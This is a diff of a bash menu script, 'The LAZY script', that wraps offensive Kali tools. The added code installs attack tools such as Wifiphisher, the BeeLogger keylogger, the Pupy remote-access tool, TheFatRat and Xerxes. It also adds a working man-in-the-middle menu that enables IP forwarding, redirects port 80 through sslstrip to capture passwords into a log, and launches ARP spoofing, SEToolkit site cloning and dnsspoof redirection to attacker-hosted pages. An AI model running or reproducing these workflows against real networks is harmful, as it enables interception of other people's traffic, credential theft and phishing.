@@ -1,6 +1,7 @@
 #! /bin/bash
 VERSION=1.9
 HOWMANYTOOLS=21
+BACKL="0"
 #############DEFAULTS###############
 TITLEBAR="The LAZY script"
 #setting yellow-start 
@@ -61,7 +62,7 @@ function banner
 	echo -e ""$YS"11"$CE") Find WPS pin    (WPA-WPA2)         "$YS"stop"$CE") d1 d2 d3"
 	echo -e ""$YS"12"$CE") WEP hacking     (WEP)            "$YS"update"$CE") Check for updates"
 	echo -e ""$YS"13"$CE") MITM                             "$YS"errors"$CE") Fix some errors"
-	echo -e ""$YS"14"$CE") Metasploit                           "$YS"ks"$CE") Custom shortucts"
+	echo -e ""$YS"14"$CE") Metasploit                           "$YS"ks"$CE") Keyboard shortucts"
 	echo -e ""$YS" 0"$CE") EXIT"
 	echo "Choose: "
 	read -e YORNAA
@@ -103,27 +104,46 @@ export MYINT
 }
 function set_interface_number
 {
-echo -e "Enter the number of your wireless card(etc type "$YS"0"$CE" if wlan0): " 
-read INUMB
-echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?"$YNYES": "
-read INTCONFNUMB
-if [ "$INTCONFNUMB" = "n" ]
-then
-	clear
-	echo -e "Then why did you type that? lol"
-	sleep 3
-	exec bash "$0"
-else
-	echo wlan$INUMB > "$LPATH"/wlan.txt
-	echo wlan"$INUMB"mon > "$LPATH"/wlanmon.txt
+while true
+do
+#~ echo -e "Enter the number of your wireless card(etc type "$YS"0"$CE" if wlan0): " 
+#~ read INUMB
+#~ echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?"$YNYES": "
+#~ read INTCONFNUMB
+#~ if [ "$INTCONFNUMB" = "n" ]
+#~ then
+	#~ clear
+	#~ echo -e "Then why did you type that? lol"
+	#~ sleep 3
+	#~ continue
+#~ else
+	#~ echo wlan$INUMB > "$LPATH"/wlan.txt
+	#~ echo wlan"$INUMB"mon > "$LPATH"/wlanmon.txt
+	#~ echo -e "Done "
+	#~ sleep 1
+	#~ clear
+	#~ echo -e "If you want to change it, type "$YS"interface"$CE" any time"
+	#~ sleep 3
+	#~ echo -e "$PAKTC"
+	#~ $READAK	
+	#~ break
+#~ fi
+echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode.(etc:"$YS"wlan0"$CE"): "
+read MANAGED
+echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode.(etc:"$YS"wlan0mon"$CE"): "
+read MONITOR
+	echo $MANAGED > "$LPATH"/wlan.txt
+	echo $MONITOR > "$LPATH"/wlanmon.txt
 	echo -e "Done "
 	sleep 1
 	clear
 	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
-	sleep 1
+	sleep 3
 	echo -e "$PAKTC"
 	$READAK	
-fi
+	BACKL="1"
+	break
+done
 }
 function checkifalready
 {
@@ -339,6 +359,1770 @@ function listshortcuts
 		KSSET="./fatrat"
 	fi
 }
+function reinstall_tools
+{
+while true
+do
+	clear
+	echo -e "Select a tool to install/reinstall"
+	echo -e " "$YS"1"$CE") Fluxion"
+	echo -e ""$YS" 2"$CE") Wifite"
+	echo -e ""$YS" 3"$CE") Wifiphisher "
+	echo -e ""$YS" 4"$CE") Zatacker"
+	echo -e ""$YS" 5"$CE") Morpheus"
+	echo -e ""$YS" 6"$CE") Osrfconsole"
+	echo -e ""$YS" 7"$CE") Hakku"
+	echo -e ""$YS" 8"$CE") Trity"
+	echo -e ""$YS" 9"$CE") Cupp"
+	echo -e ""$YS"10"$CE") Dracnmap"
+	echo -e ""$YS"11"$CE") Fern"
+	echo -e ""$YS"12"$CE") Netdiscover"
+	echo -e ""$YS"13"$CE") KickThemOut"
+	echo -e ""$YS"14"$CE") Ghost-Phisher"
+	echo -e ""$YS"15"$CE") The Eye"
+	echo -e ""$YS"16"$CE") Xerxes"
+	echo -e ""$YS"17"$CE") Mdk3-master"
+	echo -e ""$YS"18"$CE") Katana Framework"
+	echo -e ""$YS"19"$CE") Airgeddon"				
+	echo -e ""$YS"20"$CE") Websploit"
+	echo -e ""$YS"21"$CE") 4nonimizer"
+	echo -e ""$YS"22"$CE") Openvas"
+	echo -e ""$YS"23"$CE") BeeLogger"
+	echo -e ""$YS"24"$CE") Ezsploit"
+	echo -e ""$YS"25"$CE") Pupy"
+	echo -e ""$YS"26"$CE") Zirikatu"
+	echo -e ""$YS"27"$CE") WiFi-autopwner"
+	echo -e ""$YS"28"$CE") Bully"
+	echo -e ""$YS"29"$CE") Anonsurf"
+	echo -e ""$YS"30"$CE") Anonym8"
+	echo -e ""$YS"31"$CE") TheFatRat"
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS" 0"$CE") Exit"
+	echo -e "Choose: "
+	read REIN
+	clear
+	if [ "$REIN" = "1" ]
+	then
+		if [ -d "/root/fluxion" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/fluxion
+		fi
+		echo -e "Installing fluxion"
+		echo -e "Tool by Deltaxflux"
+		sleep 1
+		cd
+		wget https://fluxion.tk/fluxion-unstable.zip
+		apt-get install unzip
+		clear
+		unzip /root/fluxion*.zip -d /root
+		cd /root/fluxion/install
+		chmod +x install.sh
+		./install.sh					
+	elif [ "$REIN" = "2" ]
+	then
+		apt-get install wifite
+	elif [ "$REIN" = "3" ]
+	then
+		if [ -d "/root/wifiphisher" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/wifiphisher
+		fi
+		echo -e "Installing Wifiphisher"
+		echo -e "Tool idea by Dan McInerney"
+		sleep 1
+		git clone https://github.com/wifiphisher/wifiphisher.git
+		cd wifiphisher
+		sudo python setup.py install
+		sleep 1
+	elif [ "$REIN" = "4" ]
+	then
+		echo -e "I cannot install Zatacker. Please google how to do that yourself."
+		echo -e "PAKTGB"
+		read
+	elif [ "$REIN" = "5" ]
+	then
+		if [ -d "/root/morpheus" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/morpheus
+		fi				
+		echo -e "Installing Morpheus"
+		echo -e "Tool by Pedro ubuntu  [ r00t-3xp10it ]"
+		sleep 1
+		cd
+		git clone https://github.com/r00t-3xp10it/morpheus.git
+		cd morpheus
+		chmod +x morpheus.sh
+	elif [ "$REIN" = "6" ]
+	then
+		pip install osrframework			
+	elif [ "$REIN" = "7" ]
+	then
+		if [ -d "/root/hakkuframework" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/hakkuframework
+		fi		
+		echo -e "Installing Hakku"
+		echo -e "Tool by 4shadoww"
+		sleep 1
+		cd
+		git clone https://github.com/4shadoww/hakkuframework.git
+		cd hakkuframework
+		chmod +x hakku
+		chmod +x install							
+	elif [ "$REIN" = "8" ]
+	then
+		if [ -d "/root/Trity" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/Trity
+		fi		
+		echo -e "Installing Trity"
+		echo -e "Tool by Toxic-ig"
+		sleep 1
+		git clone https://github.com/toxic-ig/Trity.git
+		cd Trity
+		sudo python install.py							
+	elif [ "$REIN" = "9" ]
+	then
+		if [ -d "/root/cupp" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/cupp
+		fi			
+		echo -e "Installing Cupp"
+		echo -e "Tool by Muris Kurgas"
+		sleep 1
+		cd
+		git clone https://github.com/Mebus/cupp.git
+		cd cupp
+		chmod +x cupp.py	
+	elif [ "$REIN" = "10" ]
+	then
+		if [ -d "/root/Dracnmap" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/Dracnmap
+		fi			
+		echo -e "Installing Dracnmap"
+		echo -e "Tool by Edo -maland-"
+		cd
+		git clone https://github.com/Screetsec/Dracnmap.git
+		cd Dracnmap
+		chmod +x Dracnmap.sh	
+	elif [ "$REIN" = "11" ]
+	then
+		if [ -d "/root/Fern-Wifi-Cracker" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/Fern-Wifi-Cracker
+		fi		
+		echo -e "Installing Fern"
+		echo -e "Tool by Savio-code"
+		sleep 1
+		cd 
+		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
+		cd Fern-Wifi-Cracker
+		chmod +x execute.py		
+	elif [ "$REIN" = "12" ]
+	then
+		apt-get install netdiscover			
+	elif [ "$REIN" = "13" ]
+	then
+		if [ -d "/root/kickthemout" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/kickthemout
+		fi		
+		echo -e "Installing Kichthemout"
+		echo -e "Tool by Nikolaos Kamarinakis & David Schütz"
+		sleep 2
+		apt-get install nmap
+		git clone https://github.com/k4m4/kickthemout.git
+		cd kickthemout/
+		sudo python -m pip install -r requirements.txt
+	elif [ "$REIN" = "14" ]
+	then
+		if [ -d "/root/ghost-phisher" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/ghost-phisher
+		fi			
+		echo -e "Installing Ghost-Phisher"
+		echo -e "Tool by Savio-code"
+		sleep 1
+		cd
+		git clone https://github.com/savio-code/ghost-phisher.git
+		sleep 1
+		chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
+	elif [ "$REIN" = "15" ]
+	then
+		if [ -d "/root/The-Eye" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/The-Eye
+		fi			
+		echo -e "Installing The Eye"
+		echo -e "Tool by EgeBalci"
+		sleep 1
+		cd
+		git clone https://github.com/EgeBalci/The-Eye.git
+		cd The-Eye
+		chmod +x TheEye	
+	elif [ "$REIN" = "16" ]
+	then
+		if [ -d "/root/xerxes" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/xerxes
+		fi			
+		echo -e "Installing Xerxes"
+		echo -e "Tool by zanyarjamal"
+		cd
+		git clone https://github.com/zanyarjamal/xerxes
+		cd xerxes
+		gcc xerxes.c -o xerxes	
+	elif [ "$REIN" = "17" ]
+	then
+		if [ -d "/root/mdk3-master" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/mdk3-master
+		fi				
+		echo -e "Installing Mdk3-master"
+		echo -e "Tool by Musket Developer"
+		cd
+		git clone https://github.com/wi-fi-analyzer/mdk3-master.git
+		cd /root/mdk3-master
+		make
+		make install
+	elif [ "$REIN" = "18" ]
+	then
+		if [ -d "/root/KatanaFramework" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/KatanaFramework
+		fi				
+		echo -e "Installing Katana framework"
+		echo -e "Tool by PowerScript"
+		cd
+		git clone https://github.com/PowerScript/KatanaFramework.git
+		cd KatanaFramework
+		sh dependencies
+		python install					
+	elif [ "$REIN" = "19" ]
+	then
+		if [ -d "/root/airgeddon" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/airgeddon
+		fi
+			echo -e "Installing..."
+			sleep 1
+			echo -e "Installing Airgeddon"
+			echo -e "Tool by v1s1t0r1sh3r3"
+			cd
+			git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+			cd airgeddon
+			chmod +x airgeddon.sh
+	elif [ "$REIN" = "20" ]
+	then
+		apt-get install websploit			
+	elif [ "$REIN" = "21" ]
+	then
+		if [ -d "/root/4nonimizer" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/4nonimizer
+		fi		
+		echo -e "Installing 4nonimizer"
+		echo -e "Tool by Hackplayers"
+		cd
+		git clone https://github.com/Hackplayers/4nonimizer.git
+		cd 4nonimizer
+		chmod +x 4nonimizer
+		./4nonimizer install
+		clear
+		cd
+		apt-get install python-pip
+		apt-get install php-curl
+		gem install pcaprub
+		gem install packetfu	
+				elif [ "$REIN" = "22" ]
+				then
+		apt-get install openvas
+		openvas-setup
+	elif [ "$REIN" = "23" ]
+	then
+		if [ -d "/root/BeeLogger" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/BeeLogger
+		fi	
+		echo -e "Installing BeeLogger"
+		echo -e "Tool by Alisson Moretto - 4w4k3"
+		cd
+		git clone https://github.com/4w4k3/BeeLogger.git
+		cd BeeLogger
+		chmod +x install.sh
+		./install.sh
+		cd
+		apt-get install python-pip
+		apt-get install php-curl
+		gem install pcaprub
+		gem install packetfu
+		clear
+	elif [ "$REIN" = "24" ]
+	then
+		if [ -d "/root/ezsploit" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/ezsploit
+		fi				
+		echo -e "Installing Ezsploit"
+		echo -e "Tool by rand0m1ze"
+		git clone https://github.com/rand0m1ze/ezsploit.git
+		cd ezsploit/
+		chmod +x ezsploit.sh
+	elif [ "$REIN" = "25" ]
+	then
+		if [ -d "/root/pupy" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/pupy
+		fi			
+		echo -e "Installing Pupy"
+		echo -e "Tool by n1nj4sec"
+		cd
+		git clone https://github.com/n1nj4sec/pupy.git
+		cd pupy
+		git submodule init
+		git submodule update
+		pip install -r pupy/requirements.txt
+	elif [ "$REIN" = "26" ]
+	then
+		if [ -d "/root/zirikatu" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/zirikatu
+		fi		
+		echo -e "Installing Zirikatu"
+		echo -e "Tool by pasahitz"
+		cd
+		git clone https://github.com/pasahitz/zirikatu.git
+		cd zirikatu
+		chmod +x zirikatu.sh
+	elif [ "$REIN" = "27" ]
+	then
+		if [ -d "/root/WiFi-autopwner" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/WiFi-autopwner
+		fi		
+		echo -e "Installing WiFi-autopwner"
+		echo -e "Tool by Mi-Al"
+		cd
+		git clone https://github.com/Mi-Al/WiFi-autopwner.git
+	elif [ "$REIN" = "28" ]
+	then
+		if [ -d "/root/bully" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/bully
+		fi				
+		echo -e "Installing Bully"
+		echo -e "Tool by Aanarchyy"
+		cd
+		git clone https://github.com/aanarchyy/bully.git
+		cd bully
+		cd src
+		make
+		sudo make install		
+	elif [ "$REIN" = "29" ]
+	then
+		if [ -d "/root/kali-anonsurf" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/kali-anonsurf
+		fi		
+		cd
+		echo -e "Installing Anonsurf"
+		echo -e "Tool by Und3rf10w"
+		git clone https://github.com/Und3rf10w/kali-anonsurf.git
+		cd kali-anonsurf
+		chmod +x installer.sh
+		./installer.sh
+		sleep 1
+	elif [ "$REIN" = "30" ]
+	then
+		if [ -d "/root/anonym8" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/anonym8
+		fi		
+		echo -e "Installing Anonym8"
+		echo -e "Tool by HiroshiManRise"
+		git clone https://github.com/HiroshiManRise/anonym8.git
+		cd anonym8
+		chmod +x INSTALL.sh
+		./INSTALL
+		sleep 1	
+	elif [ "$REIN" = "31" ]
+	then	
+		if [ -d "/root/TheFatRat" ]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			rm -r /root/TheFatRat
+		fi	
+		echo -e "Installing TheFatRat"
+		echo -e "Tool by Screetsec"
+		cd
+		git clone https://github.com/Screetsec/TheFatRat.git
+		cd TheFatRat
+		chmod +x setup.sh && ./setup.sh	
+	elif [ "$REIN" = "back" ]
+	then
+		clear
+		break
+	elif [ "$REIN" = "00" ]
+	then	
+		exec bash "$0"
+	elif [ "$REIN" = "0" ]
+	then
+		clear
+		exit
+	fi
+	done
+}
+function errors_menu
+{
+echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
+printf '\033]2;ERRORS\a'
+echo -e ""$YS" 1"$CE") Fix no audio issue"
+echo -e ""$YS" 2"$CE") No output in wash"
+echo -e ""$YS" 3"$CE") No full screen"
+echo -e ""$YS"back"$CE") Go back"
+echo -e ""$YS" 0"$CE") EXIT"
+echo -e " Choose: "
+read ERRS
+if [ "$ERRS" = "1" ]
+then
+	clear
+	echo -e "Trying to get you some audio..."
+	sleep 2
+	clear
+	echo -e "Press "$YS"y"$CE" if/when prompted"
+	sleep 3
+	clear
+	echo -e "Installing pulseaudio......."
+	sleep 1
+	apt-get pulseaudio
+	echo -e "Enabling pulseaudio......."
+	sleep 1
+	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
+	clear
+	echo -e "Done!"
+	sleep 1
+	clear
+	echo -e "I mean...Try to see if you have audio."
+	sleep 3
+	echo -e " "
+	echo -e "That's all i can do :/"
+	sleep 2
+	echo -e " "
+	echo -e "If it wasn't fix , then try rebooting"
+elif [ "$ERRS" = "2" ]
+then
+	clear
+	echo -e "Ok...Lets try to fix this..."
+	sleep 1
+	mkdir /etc/reaver
+	echo -e "It seems to be fixed."
+	echo -e "Enter you interface"
+	read INTWASH
+	echo -e "Press "$YS"many key"$CE" to test wash"
+	echo -e "Also try "wash -i wlan0mon -a" to display all networks"
+	wash -i $INTWASH
+elif [ "$ERRS" = "3" ]
+then
+	apt-get install open-vm-tools-desktop fuse
+	echo -e "Restart your vistual machine..."
+	sleep 2
+	echo -e "$PAKTGB"
+	$READAK
+elif [ "$ERRS" = "back" ]
+then
+	BACKL="1"
+	break
+elif [ "$ERRS" = "0" ]
+then
+	clear
+	echo -e "EXITING"
+	sleep 1
+	clear
+	exit
+elif [ "$ERRS" = "00" ]
+then
+	clear
+	exec bash "$0"
+else
+	clear
+	echo -e "Not an valid option...."
+	exec bash "$0"
+fi
+}
+function keyboard_shortcuts
+{
+if [ ! -d ""$KSPATH"" ]
+then
+	mkdir "$KSPATH"
+fi
+while true
+do
+echo -e "-----------------------"$RS"KEYBOARD SHORTCUTS"$CE"------------------------"
+printf '\033]2;KEYBOARD SHORTCUTS\a'
+echo -e ""$YS" 1"$CE") Tools"
+echo -e ""$YS" 2"$CE") See hidden shortcuts"
+echo -e ""$YS"back"$CE") Go back"
+#~ echo -e ""$YS"00"$CE") Main menu"
+echo -e ""$YS" 0"$CE") EXIT"
+read KS
+clear
+if [ "$KS" = "1" ]
+then
+	while true
+	do
+	echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
+	nn=1
+	#start sorting out all the available shortcuts
+	HOWADD=$(( HOWMANYTOOLS + 1 )) 
+	while [ "$nn" != "$HOWADD" ]
+	do
+	listshortcuts
+	#adding a space where needed on the output,so it will be sorted correctly
+	if [ "$nn" -lt "10" ]
+	then
+		n=" $nn"
+	else
+		n="$nn"
+	fi
+	if [ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]
+	then
+		echo -e ""$YS""$n""$CE") "$TITLE""
+	else
+		read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
+		if [ "$KSKS" = "" ]
+		then
+			KSKS="ERROR(fix=recreate the shortcut)"
+		else
+			read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
+			size=${#TITLE}
+			calc=$(( 35-size ))
+			numcalc=1
+			SPACES=""
+			while [ $numcalc != $calc ]
+			do
+				SPACES=""$SPACES"_"
+				numcalc=$(( numcalc+1 ))
+			done
+			#~ read SPACES < "$KSPATH"/spaces.txt
+			echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
+		fi
+	fi
+	nn=$(( nn+1 ))
+	done
+	echo -e ""$YS"back"$CE") Go back"
+	#echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	#nn=""
+	read nn
+	clear
+	listshortcuts
+	if [ "$nn" = "back" ]
+	then
+		break
+	elif [ "$nn" = "0" ]
+	then
+		clear
+		exit
+	elif [ "$nn" = "00" ]
+	then
+		exec bash "$0"
+	elif [ "$nn" = "reset" ]
+	then
+		rm -r "$KSPATH"/*
+	elif [ "$nn" -le "$HOWMANYTOOLS" ] 
+	then
+		createshortcut
+	fi
+	done
+elif [ "$KS" = "2" ]
+then
+	hidden_shortcuts
+elif [ "$KS" = "back" ]
+then
+	BACKL="1"
+	break
+elif [ "$KS" = "0" ]
+then
+	clear
+	exit
+elif [ "$KS" = "00" ]
+then
+	exec bash "$0"
+fi
+done
+}
+function mitm_menu
+{
+clear
+echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
+printf '\033]2;MITM\a'
+echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
+echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
+echo -e ""$YS"back"$CE") Go back"
+echo -e ""$YS" 0"$CE") EXIT"
+read MITMATT
+clear
+if [ "$MITMATT" = "1" ]
+then
+	while true
+	do
+	clear
+	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
+	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
+	echo -e ""$YS" 2"$CE") Set iptables"
+	echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
+	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e MITMCH
+	if [ "$MITMCH" = "1" ]
+	then
+		echo "1" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [ "$MITMCH" = "d1" ]
+	then
+		echo "0" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [ "$MITMCH" = "2" ]
+	then
+		clear
+		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
+		read PORTTCP
+		if [ "$PORTTCP" = "" ]
+		then
+			PORTTCP="8080"
+		fi
+					clear
+		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
+		read PORTUDP
+		if [ "$PORTUDP" = "" ]
+		then
+			PORTUDP="40"
+		fi
+		iptables --flush
+		iptables --flush -t nat
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
+		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
+		echo -e "Done."
+		sleep 1
+	elif [ "$MITMCH" = "3" ]
+	then
+		clear
+		route -n
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your gateway(prefer eth0 gateway):"
+		read GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
+		read GATEINT
+		if [ "$GATEINT" = "" ]
+		then
+			GATEINT="eth0"
+		fi	
+		while true
+		do	
+		clear
+		nmap -sP "$GATENM"/24
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your target IP:"
+		read TARGIP
+		if [ "$TARGIP" = "r" ]
+		then
+			continue
+		else
+			break
+		fi
+		done
+		echo -e ""
+		echo -e "$PAKTC"
+		$READAK
+		export GATENM
+		export GATEINT
+		export TARGIP
+		export PORTTCP
+		export PORTUDP
+		cd "$LPATH"/ls
+		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
+		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
+		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
+		sslstrip -l $PORTTCP -w /root/sslstrip.log
+		echo -e "$PAKTGB"
+		$READAK
+		continue
+	elif [ "$MITMCH" = "33" ]
+	then
+		clear
+		echo -e "Enter your gateway(prefer eth0 gateway):"
+		read GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
+		read GATEINT
+		if [ "$GATEINT" = "" ]
+		then
+			GATEINT="eth0"
+		fi
+		clear
+		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
+		read TARGIP
+		echo -e ""
+		echo -e "$PAKTC"
+		$READAK
+		export GATENM
+		export GATEINT
+		export TARGIP
+		export PORTTCP
+		export PORTUDP
+		cd /root/lscript/ls
+		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
+		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
+		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
+		sslstrip -l $PORTTCP -w /root/sslstrip.log
+		echo -e "$PAKTGB"
+		$READAK
+		continue
+	elif [ "$MITMCH" = "4" ]
+	then
+		leafpad /root/sslstrip.log
+	#~ elif [ "$MITMCH" = "44" ]
+	#~ then
+	elif [ "$MITMCH" = "back" ]
+	then
+		clear
+		break
+	elif [ "$MITMCH" = "00" ]
+	then
+		clear
+		exec bash "$0"
+	elif [ "$MITMCH" = "0" ]
+	then
+		clear
+		exit
+	fi
+	done
+elif [ "$MITMATT" = "2" ]
+then
+	while true
+	do
+	clear
+	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
+	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
+	echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
+	echo -e ""$YS" 3"$CE") Start ARPspoofing"
+	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
+	echo -e ""$YS" 4"$CE") Start SEToolkit"
+	echo -e ""$YS" 5"$CE") Start DNSspoofing"
+	echo -e ""$YS"back"$CE") Go back"
+	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e MITMSET
+	clear
+	if [ "$MITMSET" = "1" ]
+	then
+		echo "1" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [ "$MITMSET" = "d1" ]
+	then
+		echo "0" > /proc/sys/net/ipv4/ip_forward
+		echo -e "Done."
+		sleep 1
+	elif [ "$MITMSET" = "2" ]
+	then
+		route -n
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your gateway:"
+		read GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface(etc: wlan0):"
+		read GATEINT
+		#~ if [ "$GATEINT" = "" ]
+		#~ then
+			#~ GATEINT="eth0"
+		#~ fi
+		while true
+		do		
+		clear
+		nmap -sP "$GATENM"/24
+		echo -e ""
+		echo -e ""
+		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
+		read TARGIP
+		if [ "$TARGIP" = "r" ]
+		then
+			continue
+		else
+			break
+		fi
+		done
+	elif [ "$MITMSET" = "22" ]
+	then
+		echo -e "Enter your gateway:"
+		read GATENM
+		echo -e ""
+		echo -e "Enter the gateway's interface(etc: wlan0):"
+		read GATEINT
+		#~ if [ "$GATEINT" = "" ]
+		#~ then
+			#~ GATEINT="eth0"
+		#~ fi
+		clear
+		echo -e "Enter your target IP:"
+		read TARGIP
+	elif [ "$MITMSET" = "3" ]
+	then
+		export PAKTC
+		export GATEINT
+		export TARGIP
+		export GATENM
+		cd "$LPATH"/ls
+		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
+		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
+	#~ elif [ "$MITMSET" = "4" ]
+	#~ then
+		#~ service apache2 start
+	#~ elif [ "$MITMSET" = "d4" ]
+	#~ then
+		#~ service apache2 stop
+	elif [ "$MITMSET" = "4" ]
+	then
+		echo -e "Clone a website to one of the following IP(s):"
+		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
+		echo -e "$PAKTC"
+		$READAK
+		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
+	elif [ "$MITMSET" = "5" ]
+	then
+		echo -e "Making you a hosts.txt file"
+		echo -e ""
+		echo -e "Enter your IP address that you started the server:"
+		echo -e "One of this/these:"
+		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
+		read -e SERVIP
+		echo -e "Enter the interface of that IP(etc: wlan0):"
+		read -e INTIP
+		if [ -f ""$LPATH"/HOSTS/hosts.txt" ]
+		then
+			rm "$LPATH"/HOSTS/hosts.txt
+		fi
+		mkdir "$LPATH"/HOSTS
+		clear
+		while true
+		do
+		clear
+		echo -e "Enter the URL you want to redirect your IP from(etc: thisis.myfakesite.com):"
+		read -e URL
+		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
+		sleep 0.2
+		clear
+		echo -e "Add another one as well?"$YNYES""
+		read -e ANOTHERHOST
+		if [ "$ANOTHERHOST" = "n" ]
+		then
+			break
+		fi
+		done
+		clear
+		echo -e "Starting dnsspoof..."
+		echo -e "$PAKTC"
+		$READAK
+		export INTIP
+		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
+	elif [ "$MITMSET" = "back" ]
+	then
+		clear
+		break
+	elif [ "$MITMSET" = "00" ]
+	then
+		clear
+		exec bash "$0"
+	elif [ "$MITMSET" = "0" ]
+	then
+		clear
+		exit
+	fi
+	done
+elif [ "$MITMATT" = "back" ]
+then
+	BACKL="1"
+	break
+elif [ "$MITMATT" = "00" ]
+then			
+	clear
+	exec bash "$0"
+elif [ "$MITMATT" = "0" ]
+then
+	clear
+	exit
+fi
+}
+function wifi_tools
+{
+	while true
+	do
+	printf '\033]2;WIFI TOOLS\a'
+	clear
+	echo -e "---------------------------"$RS"WIFI TOOLS"$CE"----------------------------"
+	if [ -d /root/fluxion ]
+	then
+		echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
+	else
+		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"            Multitool-Fake AP with pass confirmation"
+	fi
+	if [ -f /usr/bin/wifite ]
+	then
+		echo -e ""$YS" 2"$CE") Wifite             Multitool"
+	else
+		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"             Multitool"
+	fi
+	if [ -d /root/wifiphisher ]
+	then
